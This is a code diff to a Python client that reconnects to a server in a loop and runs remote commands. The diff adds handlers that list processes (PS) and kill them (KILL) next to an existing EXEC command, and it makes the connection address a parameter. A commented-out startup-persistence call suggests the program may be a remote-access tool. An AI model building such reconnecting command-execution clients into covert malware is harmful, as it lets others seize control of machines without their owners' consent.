@@ -18,7 +18,9 @@ import subprocess
 from pydoc import help
 from zipfile import ZipFile
 
-from utils.process import kill
+from psutil import AccessDenied
+
+from utils.process import kill, ps
 from utils.errors import errors
 from utils.esocket import ESocket
 from utils.file import reverse_readline
@@ -164,6 +166,19 @@ class Client(object):
 
             if data[0] == 'FROZEN':
                 self.send_json(getattr(sys, 'frozen', False))
+                continue
+
+            if data[0] == 'PS':
+                self.send_json(ps())
+                continue
+
+            if data[0] == 'KILL':
+                try:
+                    kill(data[1])
+                except AccessDenied:
+                    self.esock.send(b'Access Denied', '1')
+                else:
+                    self.esock.send(b'Killed')
                 continue
 
             if data[0] == 'EXEC':
@@ -350,14 +365,14 @@ class Client(object):
                 continue
 
 
-def main(retry_timer: int = 10) -> None:
+def main(address: tuple, retry_timer: int = 10) -> None:
     """ Run Client """
     # RETRY_TIMER: Time to wait before trying to reconnect
     client = Client()
     logging.info('Starting connection loop')
     while True:
         try:
-            client.connect(('', 8001))
+            client.connect(address)
         except Exception as error:
             print(error)
             time.sleep(retry_timer)
@@ -374,4 +389,4 @@ if __name__ == '__main__':
     # Add Client to Startup when Client is run
     # add_startup()
     while True:
-        main()
+        main(('', 8001))
